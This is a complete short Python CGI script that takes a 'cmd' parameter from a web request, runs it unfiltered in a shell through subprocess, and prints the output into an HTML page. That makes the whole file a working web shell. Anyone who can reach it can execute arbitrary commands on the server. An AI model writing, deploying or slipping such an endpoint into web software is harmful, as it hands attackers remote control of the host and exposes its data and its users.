#!/usr/bin/python3
import subprocess
import cgi

print("content-type: text/html")
print()

data = cgi.FieldStorage()
command = data.getvalue("cmd")

output = subprocess.getoutput(command)
print("<pre>"+ output + "</pre>")